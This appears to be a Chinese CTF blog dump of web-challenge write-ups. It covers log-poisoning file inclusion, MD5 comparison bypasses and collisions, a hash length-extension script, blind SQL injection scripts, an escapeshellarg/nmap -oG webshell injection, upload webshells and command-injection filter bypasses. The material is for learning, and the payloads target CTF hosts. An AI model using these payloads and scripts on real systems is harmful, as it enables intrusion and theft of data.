\n\n这个题目有点奇怪，其他题目都是过滤掉关键字，但这个题目的第一个匹配竟然是必须出现给出的字母。也是让我搞不明白，看了题解才知道这似乎是一个提示。\n在最后面看见了include()函数，我们断定这是一个文件包含的题目，但是第二次匹配直接过滤了SSRF和php伪协议，一切都指向日志包含，于是我们尝试访问默认日志路径，发现默认路径包含上述所有字母\nincompetent=HelloWorld&amp;Datch=/var/log/nginx/access.log\n\n这样就简单了我们直接user-agent注入\naaaaaaa&lt;?php system(&#x27;tac /flag&#x27;);?&gt;//记得在前面加上标识，好找结果\n\n\n\n\n\n6.所以你说你懂 MD5?MD5我的一生之敌\n &lt;?phpsession_start();highlight_file(__FILE__);// 所以你说你懂 MD5 了?$apple = $_POST[&#x27;apple&#x27;];$banana = $_POST[&#x27;banana&#x27;];if (!($apple !== $banana &amp;&amp; md5($apple) === md5($banana))) &#123;    die(&#x27;加强难度就不会了?&#x27;);&#125;// 什么? 你绕过去了?// 加大剂量!// 我要让他成为 string$apple = (string)$_POST[&#x27;appple&#x27;];$banana = (string)$_POST[&#x27;bananana&#x27;];if (!((string)$apple !== (string)$banana &amp;&amp; md5((string)$apple) == md5((string)$banana))) &#123;    die(&#x27;难吗?不难!&#x27;);&#125;// 你还是绕过去了?// 哦哦哦, 我少了一个等于号$apple = (string)$_POST[&#x27;apppple&#x27;];$banana = (string)$_POST[&#x27;banananana&#x27;];if (!((string)$apple !== (string)$banana &amp;&amp; md5((string)$apple) === md5((string)$banana))) &#123;    die(&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;);&#125;// 你以为这就结束了if (!isset($_SESSION[&#x27;random&#x27;])) &#123;    $_SESSION[&#x27;random&#x27;] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));&#125;// 你想看到 random 的值吗?// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧$random = $_SESSION[&#x27;random&#x27;];echo md5($random);echo &#x27;&lt;br /&gt;&#x27;;$name = $_POST[&#x27;name&#x27;] ?? &#x27;user&#x27;;// check if name ends with &#x27;admin&#x27;if (substr($name, -5) !== &#x27;admin&#x27;) &#123;    die(&#x27;不是管理员也来凑热闹?&#x27;);&#125;$md5 = $_POST[&#x27;md5&#x27;];if (md5($random . $name) !== $md5) &#123;    die(&#x27;伪造? NO NO NO!&#x27;);&#125;// 认输了, 看样子你真的很懂 MD5// 那 flag 就给你吧echo &quot;看样子你真的很懂 MD5&quot;;echo file_get_contents(&#x27;/flag&#x27;); 加强难度就不会了?\n\n这题目分为四关，每一关我们都需要独特的绕过手法，全是和MD5有关\n第一关\n$apple = $_POST[&#x27;apple&#x27;];$banana = $_POST[&#x27;banana&#x27;];if (!($apple !== $banana &amp;&amp; md5($apple) === md5($banana))) &#123;    die(&#x27;加强难度就不会了?&#x27;);&#125;//没有进行类型转化，直接数组绕过\n\n第二关\n$apple = (string)$_POST[&#x27;appple&#x27;];$banana = (string)$_POST[&#x27;bananana&#x27;];if (!((string)$apple !== (string)$banana &amp;&amp; md5((string)$apple) == md5((string)$banana))) &#123;    die(&#x27;难吗?不难!&#x27;);&#125;\n\n注意看，这里的参数和之前不一样，我还卡了一下。这次进行了类型转化，我们需要让两个不同的字符串被md5编码后的结果在弱类型比较时相等我们可以使用科学计数法绕过，当php版本&gt;8时会对字符串进行科学计数法检查。但是严格比较不行，不会进行类型转化也不会检查科学计数法\nMAUXXQC 0e478478466848439040434801845361IHKFRNS 0e256160682445802696926137988570GZECLQZ 0e537612333747236407713628225676GGHMVOE 0e362766013028313274586933780773GEGHBXL 0e248776895502908863709684713578EEIZDOI 0e782601363539291779881938479162DYAXWCA 0e424759758842488633464374063001\n\n这是一些可以使用的字符串\n第三关\n$apple = (string)$_POST[&#x27;apppple&#x27;];$banana = (string)$_POST[&#x27;banananana&#x27;];if (!((string)$apple !== (string)$banana &amp;&amp; md5((string)$apple) === md5((string)$banana))) &#123;    die(&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;);&#125;\n\n这次变为了严格比较，我们不能用科学计数法去绕过。这次我们需要实打实的让两个不同的字符串被MD5编码后结果相等，这就是MD5碰撞\n$a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2$b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2\n\n第四关\nif (!isset($_SESSION[&#x27;random&#x27;])) &#123;    $_SESSION[&#x27;random&#x27;] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));&#125;// 你想看到 random 的值吗?// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧$random = $_SESSION[&#x27;random&#x27;];echo md5($random);echo &#x27;&lt;br /&gt;&#x27;;$name = $_POST[&#x27;name&#x27;] ?? &#x27;user&#x27;;// check if name ends with &#x27;admin&#x27;if (substr($name, -5) !== &#x27;admin&#x27;) &#123;    die(&#x27;不是管理员也来凑热闹?&#x27;);&#125;$md5 = $_POST[&#x27;md5&#x27;];if (md5($random . $name) !== $md5) &#123;    die(&#x27;伪造? NO NO NO!&#x27;);&#125;// 认输了, 看样子你真的很懂 MD5// 那 flag 就给你吧echo &quot;看样子你真的很懂 MD5&quot;;echo file_get_contents(&#x27;/flag&#x27;); 加强难度就不会了?\n\n这个是一个哈希长度拓展攻击，我们需要通过random的MD5编码和传入指定name&#x3D;admin实现推断出md5($random,$name)的值然后传入$md5\n这个就是一个典型的MD5长度拓展攻击，由于不知道MD5加密的具体算法，只能用题解的脚本\nfrom struct import pack, unpackfrom math import floor, sin&quot;&quot;&quot;MD5 Extension Attack====================@refshttps://github.com/shellfeel/hash-ext-attack&quot;&quot;&quot;class MD5:    def __init__(self):        self.A, self.B, self.C, self.D = \\            (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476)  # initial values        self.r: list[int] = \\            [7, 12, 17, 22] * 4 + [5,  9, 14, 20] * 4 + \\            [4, 11, 16, 23] * 4 + [6, 10, 15, 21] * 4  # shift values        self.k: list[int] = \\            [floor(abs(sin(i + 1)) * pow(2, 32))             for i in range(64)]  # constants    def _lrot(self, x: int, n: int) -&gt; int:        # left rotate        return (x &lt;&lt; n) | (x &gt;&gt; 32 - n)    def update(self, chunk: bytes) -&gt; None:        # update the hash for a chunk of data (64 bytes)        w = list(unpack(&#x27;&lt;&#x27;+&#x27;I&#x27;*16, chunk))        a, b, c, d = self.A, self.B, self.C, self.D        for i in range(64):            if i &lt; 16:                f = (b &amp; c) | ((~b) &amp; d)                flag = i            elif i &lt; 32:                f = (b &amp; d) | (c &amp; (~d))                flag = (5 * i + 1) % 16            elif i &lt; 48:                f = (b ^ c ^ d)                flag = (3 * i + 5) % 16            else:                f = c ^ (b | (~d))                flag = (7 * i) % 16            tmp = b + \\                self._lrot((a + f + self.k[i] + w[flag])                           &amp; 0xffffffff, self.r[i])            a, b, c, d = d, tmp &amp; 0xffffffff, b, c        self.A = (self.A + a) &amp; 0xffffffff        self.B = (self.B + b) &amp; 0xffffffff        self.C = (self.C + c) &amp; 0xffffffff        self.D = (self.D + d) &amp; 0xffffffff    def extend(self, msg: bytes) -&gt; None:        # extend the hash with a new message (padded)        assert len(msg) % 64 == 0        for i in range(0, len(msg), 64):            self.update(msg[i:i + 64])    def padding(self, msg: bytes) -&gt; bytes:        # pad the message        length = pack(&#x27;&lt;Q&#x27;, len(msg) * 8)        msg += b&#x27;\\x80&#x27;        msg += b&#x27;\\x00&#x27; * ((56 - len(msg)) % 64)        msg += length        return msg    def digest(self) -&gt; bytes:        # return the hash        return pack(&#x27;&lt;IIII&#x27;, self.A, self.B, self.C, self.D)def verify_md5(test_string: bytes) -&gt; None:    # (DEBUG function) verify the MD5 implementation    from hashlib import md5 as md5_hashlib    def md5_manual(msg: bytes) -&gt; bytes:        md5 = MD5()        md5.extend(md5.padding(msg))        return md5.digest()    manual_result = md5_manual(test_string).hex()    hashlib_result = md5_hashlib(test_string).hexdigest()    assert manual_result == hashlib_result, &quot;Test failed!&quot;def attack(message_len: int, known_hash: str,           append_str: bytes) -&gt; tuple:    # MD5 extension attack    md5 = MD5()    previous_text = md5.padding(b&quot;*&quot; * message_len)    current_text = previous_text + append_str    md5.A, md5.B, md5.C, md5.D = unpack(&quot;&lt;IIII&quot;, bytes.fromhex(known_hash))    md5.extend(md5.padding(current_text)[len(previous_text):])    return current_text[message_len:], md5.digest().hex()if __name__ == &#x27;__main__&#x27;:    message_len = int(input(&quot;[&gt;] Input known text length: &quot;))    known_hash = input(&quot;[&gt;] Input known hash: &quot;).strip()    append_text = input(&quot;[&gt;] Input append text: &quot;).strip().encode()    print(&quot;[*] Attacking...&quot;)    extend_str, final_hash = attack(message_len, known_hash, append_text)    from urllib.parse import quote    from base64 import b64encode    print(&quot;[+] Extend text:&quot;, extend_str)    print(&quot;[+] Extend text (URL encoded):&quot;, quote(extend_str))    print(&quot;[+] Extend text (Base64):&quot;, b64encode(extend_str).decode())    print(&quot;[+] Final hash:&quot;, final_hash)\n\n至于原理就是\n本来进行加密\nmd5($random.$name);//我们可以$randow + padding +长度数据//构成第一数据块，那样第一次运算的结果就是输出出来的编码值，通过编码值可以反推出向量串//第二块数据块就是admin +padding +总长度数据//我们也知道第二块数据块//在知道数据块和向量串的情况下可以推出最后一次编码结果\n\n但是我们需要知道$_SESSION[&#39;random&#39;]的长度我们才可以推测出总长度顺序，我们可以看这个代码\n$_SESSION[&#x27;random&#x27;] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)); \n\nrandom由三串任意16个字节转二进制凭借而成，一个字节对应两个二进制数字，所以总共有16*2*3&#x3D;96个二进制字符\n脚本的使用\n\n\n我们首先输入长度值，然后输入给我们MD5加密字符串，最后输入我们需要加上的字符串就可以拿到payload\n这个题目的admin检测是从后面检测，那个跑出来的哈希值就是$md5\npayload:\napple%5B%5D=1&amp;banana%5B%5D=2&amp;appple=MAUXXQC&amp;bananana=IHKFRNS&amp;apppple=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;banananana=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;name=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%03%00%00%00%00%00%00admin&amp;md5=7539ca2c23d74d391d9c4668ff776f3d\n\n\n\n\n\n7.only one sql这个题目用的是时间盲注，正好之前没怎么写过时间盲注的脚本\n &lt;?phphighlight_file(__FILE__);$sql = $_GET[&#x27;sql&#x27;];if (preg_match(&#x27;/select|;|@|\\n/i&#x27;, $sql)) &#123;    die(&quot;你知道的，不可能有sql注入&quot;);&#125;if (preg_match(&#x27;/&quot;|\\$|`|\\\\\\\\/i&#x27;, $sql)) &#123;    die(&quot;你知道的，不可能有RCE&quot;);&#125;//flag in ctf.flag$query = &quot;mysql -u root -p123456 -e \\&quot;use ctf;select &#x27;没有select，让你执行一句又如何&#x27;;&quot; . $sql . &quot;\\&quot;&quot;;system($query); \n\n但是这个题目把select给过滤掉了，但是给了我们很多关键词\nshow databases #查库show tables #查表 Tables_in_ctf flagshow columns from flag #查字段 id data\n\n我们知道字段后就可以开始时间盲注，由于过滤掉了select 我们需要使用其他带查询功能的语句\ndelete为删除作用但是服务器端好像把删除作用给禁止了，所以我们可以使用delete 的where\ndelete from flag where #这样无参数，不会进行删除\n\n这是我写的一个时间盲注脚本\nimport requestsurl=&#x27;http://gz.imxbt.cn:20489/`&#x27;flagstr=&#x27;&#123;abcdefghijklmnopqrstuvwxyz-1234567890&#125;&#x27;flag=&#x27;&#x27;for i in range(1,50):    for j in flagstr:        data=&#123;            &#x27;sql&#x27;:&quot;delete from flag where data regexp(&#x27;&#123;&#125;&#x27;) and sleep(3)&quot;.format(flag+j)        &#125;#sql语句利用and的特性，如果前面返回0则不会执行后面的语句        try:            response = requests.get(url, params=data, timeout=3)#timeout=3 当访问时间超过3秒报错进入except        except:            print(flag)            flag=flag+j            break\n\n\n\n8.复读机虽然是个简单题，但是我写不出，SSTI才刚学没多久，这次又用到了不认识的方法，我真的是服了\n这次题目过滤掉了\n+ - * / . &#123;&#123; &#125;&#125; __ : &quot; \\\n\n其他都是小问题，主要是过滤掉了__双下划线\n"},{"title":"[Black_Watch_入群题]Web","url":"/2025/05/13/Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web/","content":"[Black_Watch_入群题]Web这个题目和前面几个比起来，竟然是出奇的容易了一点，就是一个简单的sql布尔忙抓题目，只是注入点比较难找\n打开界面有三个界面和一个登录界面，登录试了一下没sql注入，应该也不是弱口令，突破口应该在那三个界面\n\n\n当我们点进去后发现url中出现了一个疑似参数的地方，我们改变数字还会跳转到其他界面，于是怀疑这里有传参，直接抓参数包看看\n\n\n发现通过GET请求传递了一个id参数，我们尝试再使用万能密码发现把or给过滤掉了，而且还返回的是json数据\n我尝试用|代替，但是也被过滤了，这个时候就想起来异或了通过1和0之间进行异或返回1或0，使用^进行异或运算|和&amp;在C语言中就是异或运算符，但是在sql中变成了or和and\n\n\n回显无报错，有差异，这是典型的布尔盲注，用二分法爆破数据，懒得写爆破脚本，直接抄大佬的\nimport requestsflag = &#x27;&#x27;# 查库名payload1 = &#x27;1^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)^1&#x27;  # 库名为news# 查表名payload2 = &#x27;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\&#x27;news\\&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&#x27;  # 表名为admin,contents# 查字段payload3 = &#x27;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\\&#x27;contents\\&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&#x27;  # admin表里有id,username,password,is_enable# contents表里有id,title,content,is_enable# 查字段值payload4 = &#x27;1^(ascii(substr((select(group_concat(password))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;)^1&#x27;  # 分别查username和passwordfor i in range(1, 100):    low = 28    high = 137    mid = (low + high) // 2    while (low &lt; high):        url = &#x27;http://87680ed1-faf2-45fc-9d9d-f46e5ba64479.node5.buuoj.cn/backend/content_detail.php?id=&#x27;        payload = payload4.format(i, mid)        url += payload        print(url)        r = requests.get(url)        text = str(r.json())        if &quot;札师傅缺个女朋友&quot; in text:            low = mid + 1        else:            high = mid        mid = (low + high) // 2    if (chr(mid) == &#x27;&#x27;):        break    flag += chr(mid)    print(flag)print(flag)# 这个代码使用了id=1时的情况,使用了二分法提高了查询的速度\n\n看来这个题目不是对我们的输入过滤了or，而是对我们运算后的结果进行过滤，在注入的时候information还可以用\n我们只需要将username和password分别注出来，然后登录第二个账号即可获得flag\n"},{"title":"[BUUCTF_2018]Online_Tool","url":"/2025/06/19/BUUCTF-2018-Online-Tool/","content":"[BUUCTF_2018]Online_Toolbuu都写到第6版了，发现题目已经不是我这个水平能写的了，太多代码审计了，还是要多练啊。\n还不如把以前没写的题目再写完\n&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123;    highlight_file(__FILE__);&#125; else &#123;    $host = $_GET[&#x27;host&#x27;];    $host = escapeshellarg($host);    $host = escapeshellcmd($host);    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);    echo &#x27;you are in sandbox &#x27;.$sandbox;    @mkdir($sandbox);    chdir($sandbox);    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125;\n\n一个命令执行的代码，会进行目录创建然后执行命令，但是有两个过滤函数escapeshellarg和escapeshellcmd，导致我们无法直接进行命令执行。\nescapeshellarg() 是 PHP 中一个重要的安全函数，用于在将用户输入传递给 shell 命令时进行安全转义。\nescapeshellarg() 函数的作用是：\n\n将字符串转义为一个安全的 shell 参数\n在字符串周围添加单引号\n转义字符串中已有的单引号\n\nescapeshellcmd() 会转义以下字符：\n\n# &amp; ; , | * ? ~ &lt; &gt; ^ ( ) [ ] { } $ \\ \\x0A \\xFF&#96;\n单引号和双引号（仅在不成对时）\n在 Windows 上，还转义 % 和 !\n\nescapeshellarg处理后先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。\n127.0.0.1’ -oG经过 escapeshellarg处理后就变成了’127.0.0.1’\\‘’ -oG ‘ 也就是发现单引号进行转义，且以它为中心分割为三部分（在两边加单引号） 。\n即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。\n随后在进经过escapeshellcmd 时变成：’127.0.0.1’\\\\‘’ -oG \\‘也就是将不成对的单引号及任意\\进行添加\\的操作。\n但是由于对\\进行了转义，导致多出了一个单引号，然后就会对最后一个单引号进行转义\n导致我们后面的-oG可以拼接到命令当中，我们可以利用这个方法进行命令拼接\nnmap有一个参数-oG可以实现将命令和结果写到文件\nnmap [扫描选项] -oG &lt;输出文件名&gt; &lt;目标&gt;\n\n\n\n\n\n我们先直接来看payload\n?host=&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;\n\n经过escapeshellarg后就变成了\n&#x27;\\&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php \\&#x27;&#x27;\n\n然后再经过escapeshellcmd则是\n&#x27;\\\\&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php \\\\&#x27;&#x27;\n\n导致单引号转义失效，最后变成了\nnmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;  &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;&#x27;\n\n通过nmap的-oG参数将代码写入test.php\n\n\n拿到目录，直接访问\n\n\n"},{"title":"Buuctf","url":"/2025/01/15/Buuctf/","content":"buuctf笔记前言此笔记用于记录在buuctf web上做题的笔记与题解\n1.[极客大挑战 2019]EasySQL第一题当然是最简单的，一个普通的万能密码即可\n\n\n此关必须输入用户名和密码，应该是提前判定不得为空\n2.[极客大挑战 2019]Havefun本题界面无任何可操作的东西，于是我们可以通过查看界面源代码看下是否有提示\n\n\n我们可以看到注释当$cat&#x3D;’dog’时有输出，我们可以试下传入get请求**?cat&#x3D;dog** 即可\n3.[HCTF 2018]WarmUp 本题界面无任何操作，仍然查看界面源代码\n\n\n发现被注释掉的文件source.php，我们可以访问一下\nhttp://1a596ae8-813c-47fd-a2b9-ac4509d73e89.node5.buuoj.cn:81/source.php\n\n得到以下代码：\n &lt;?php    highlight_file(__FILE__);    class emmm    &#123;        public static function checkFile(&amp;$page)        &#123;            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];//出现未知文件，访问可得到信息&#x27;flag not here, and flag in ffffllllaaaagggg&#x27; 得知flag在文件ffffllllaaaagggg中            if (! isset($page) || !is_string($page)) &#123;                echo &quot;you can&#x27;t see it&quot;;                return false;            &#125;            if (in_array($page, $whitelist)) &#123;//我们可以直接输入file=source.php返回true,但执行出来没有意义                return true;            &#125;            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)//这里在输入后面连接一个?,然后再取0到第一个?中间的进行赋值            );            if (in_array($_page, $whitelist)) &#123;//我们可以输入&#x27;file=source.php?../ffffllllaaaagggg&#x27;返回true的同时访问文件                return true;            &#125;            $_page = urldecode($page);//进行一次解码            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)            );            if (in_array($_page, $whitelist)) &#123;//相应的有第二种方法访问文件                return true;            &#125;            echo &quot;you can&#x27;t see it&quot;;            return false;        &#125;    &#125;    if (! empty($_REQUEST[&#x27;file&#x27;])//判断请求不为空        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])//判断请求为字符串        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])    ) &#123;        include $_REQUEST[&#x27;file&#x27;];//条件达成后执行请求        exit;    &#125; else &#123;//没通过就只有图片了        echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;;    &#125;  ?&gt; \n\n经过上述分析我们得到两种方法，分别为进行解码与不进行解码\nfile=source.php?../ffffllllaaaaggggfile=source.php%3F../ffffllllaaaagggg//%3F为&#x27;?&#x27;的url编码//&#x27;../&#x27;路径表示时用来跨目录表，没找到flag就多跨几次直到找到为止\n\n4.[极客大挑战 2019]Upload首先我们随意上传文件并抓包测试得出\n前端无验证，后端验证包括文件后缀验证(不能上传.php文件)，content-type验证(需使用图片)，文件头检测，文件内容检测(不能出现&lt;?)\n也就意味着我们不能上传普通php一句话后门\n起初我想说使用日志文件包含，但是我发现两个问题，首先头文件加了GIF89a的.user.ini被访问时被当作图片解析。其次在蚁剑连接好后，我去看了一下日志文件的路径，发现和万能路径不一样万能路径：\nauto_prepend_file=/var/log/nginx/access.log\n\n然后只能去找题解了\n由于黑名单只限制了.php，我们只需改为.phtml仍然可以执行\n然后就是内容：\nGIF89a&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;a&#x27;]);&lt;/script&gt; \n\n这样可以用js绕过，但我js没深入学\n上传之后用蚁剑连接即可\n\n\n5.[MRCTF2020]你传你🐎呢这个题目也是无前端验证，也没有任何提示，只有一句**我扌your problem?**只能抓包看看\n发现只有简单的content-type验证和.php和.phtml的黑名单\n于是首先想到.user.ini，但又担心没有.php文件，于是改用.htaccess。后面蚁剑连接上了，证实的确没有.php文件\n于是上传.txt一句话后门，然后再上传.htaccess开门，最后用蚁剑连接即可\n6.[ACTF2020 新生赛]Upload这是一个文件上传的题目\n我们首先尝试一句话后门，发现前端验证只允许图片上传，想找网页源码，但有点复杂找不到，于是直接关闭js即可，然后抓包测试\n经过测试发现.php进入黑名单，content-type也有限制，这样我们改为.phtml就可以绕过，绕过之后还直接给出相对路径，直接访问然后蚁剑连接即可\n7.[ACTF2020 新生赛]Include学了文件包含来一道题\n首先我们看到主界面，只有一个tips链接，我们点开以后：\n\n\n然后尝试抓包，发现\n\n\n没有任何内容，仅仅只有一个flag.php文件，结合以上我们有理由猜测这是include(flag.php)，我们知道路径在同一根目录下，直接上伪协议\n?file=php://filter/convert.base64-encode/resource=flag.php\n\n把拿到的内容进行解码即可：\n&lt;?phpecho &quot;Can you find out the flag?&quot;;//flag&#123;110eaaa4-5b39-455b-a3c7-6aa0f3a679cc&#125;\n\n果然和想的一样\n8.[ACTF2020 新生赛]Exec学习了命令执行，来做道题\n首先给我们看到的是一个输入ip的界面，我们输入ip尝试一下，发现是命令执行的题目，由于直接只需输入ip就行了，我们判断为直接命令执行，尝试输入\n127.0.0.1|ls//发现正常执行 存在//index.php\n\n我们继续输入：\n1237.0.0.1|cat index.php//用于查看源码\n\n\n\n发现是最简单的命令执行，于是我们找flag即可\n127.0.0.1|ls ///从根目录开始找，肯定不是因为buuctf每次都放根目录127.0.0.1|ls ..///每次返回一级目录的找\n\n最后在根目录下发现flag，直接cat 就可以拿到\n127.0.0.1|cat /flag//记得用绝对路径\n\n9.[GXYCTF2019]Ping Ping Ping看见Ping就知道是命令执行的题目\n还是直接ls试一下，发现存在index.php和flag.php文件，我们直接尝试访问\n经过了长时间的FUCK，我终于拿到源码了，FUCK就不看了，上源码：\n/?ip=&lt;pre&gt;/?ip=&lt;?phpif(isset($_GET[&#x27;ip&#x27;]))&#123;  $ip = $_GET[&#x27;ip&#x27;];  if(preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123;    echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match);    die(&quot;fxck your symbol!&quot;);  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;    die(&quot;fxck your space!&quot;);  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;    die(&quot;fxck your bash!&quot;);  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;    die(&quot;fxck your flag!&quot;);  &#125;  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);  echo &quot;&lt;pre&gt;&quot;;  print_r($a);&#125;?&gt;//过滤掉的东西有点多\n\n过滤掉这么多符号，但是我们只需要解决flag的拼写问题即可，直指shell\n//命令执行的语句其实感觉和bash是一样的，我们也可以用bash的语法127.0.0.1;a=g;cat$IFS$9fla$a.php//bash里面变量竟然不需要规定类型，也不需要标识符，好高级好自由，只需要在用的时候前面加$即可\n\n10.[SUCTF 2019]EasySQL之前写出来的题目，但再次来看的时候已经忘了，看了题解之后更加确信之前是直接抄的payload。现在已经可以看得懂了\n界面的话就是一个简单的POST传参\n\n\n我们输入1的时候返回一个数组，值就是1。也就是说估计是一个查询语句\nselect .&quot;$_POST[]&quot;. from ...\n\n然后试了下过滤，发现\nand or from flag //都被过滤掉了\n\n\n\n如果我们正常写入数字的话，无论什么都会返回1，但是加了注释之后就变成了原来的值，我们有理由推断\nselect 123456 ||flag from Flag\n\n好在;给我们放出来了，我们可以看下表名，表名为Flag，但我认为没什么用\n最后的payload就是\nselect POST ||flag from Flag#我们传入 *,1就成了select * 1||flag from Flag#就相当于select *,1 from Flag#这种方法以前没见过，也算是长见识了\n\n\n\n11.[RoarCTF 2019]Easy Calc这个题目界面只有一个简单的输入框，还有js过滤，关掉就行。我们可以抓包去看下我们的算式传到哪里去了\n\n\n我们看见有一个calc.php文件，我们访问一下\n&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123;    show_source(__FILE__);&#125;else&#123;        $str = $_GET[&#x27;num&#x27;];        $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;];        foreach ($blacklist as $blackitem) &#123;                if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123;                        die(&quot;what are you want to do?&quot;);                &#125;        &#125;        eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; \n\n以前也没在eval()里面看见echo有什么用，而且过滤掉了’让我无法闭合，又要涨见识了，只能去看大佬的题解\n我们在get请求时，发现当含有字母时会被防火墙拦截，但是num前面加个空格就不会被拦截\nWAF（Web 应用防火墙）可能会通过检测特定变量名来阻止某些恶意输入，但由于 PHP 的解析特性，空格的存在会改变变量的名称，导致绕过安全检测\n回到题目，也就是说当我们传入的参数名为%20num而非num时，针对num变量的WAF就不会生效，而由于PHP的解析特性%20num会被解析成num正常执行\n由于有echo 我们可以先看下目录，我们可以使用scandir()和var_dump()来查看当前目录\nvar_dump()\t用于输出一个或多个变量的详细信息，包括变量的类型和值scandir()\t用于读取指定目录中的文件和子目录\n\n但是路径需要使用的/被过滤掉了，我们可以使用编码绕过(这我以前也不知道)，通过chr()函数进行解码\nvar_dump(scandir(chr(47)))//查看根目录//我又疏忽了，因为echo无法直接输出数组，要用print_r或var_dump才可以//所以得命令分隔?%20num=1;var_dump(scandir(chr(47)))\n\n1array(24) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(3) &quot;bin&quot; [4]=&gt; string(4) &quot;boot&quot; [5]=&gt; string(3) &quot;dev&quot; [6]=&gt; string(3) &quot;etc&quot; [7]=&gt; string(5) &quot;f1agg&quot; [8]=&gt; string(4) &quot;home&quot; [9]=&gt; string(3) &quot;lib&quot; [10]=&gt; string(5) &quot;lib64&quot; [11]=&gt; string(5) &quot;media&quot; [12]=&gt; string(3) &quot;mnt&quot; [13]=&gt; string(3) &quot;opt&quot; [14]=&gt; string(4) &quot;proc&quot; [15]=&gt; string(4) &quot;root&quot; [16]=&gt; string(3) &quot;run&quot; [17]=&gt; string(4) &quot;sbin&quot; [18]=&gt; string(3) &quot;srv&quot; [19]=&gt; string(8) &quot;start.sh&quot; [20]=&gt; string(3) &quot;sys&quot; [21]=&gt; string(3) &quot;tmp&quot; [22]=&gt; string(3) &quot;usr&quot; [23]=&gt; string(3) &quot;var&quot; &#125; 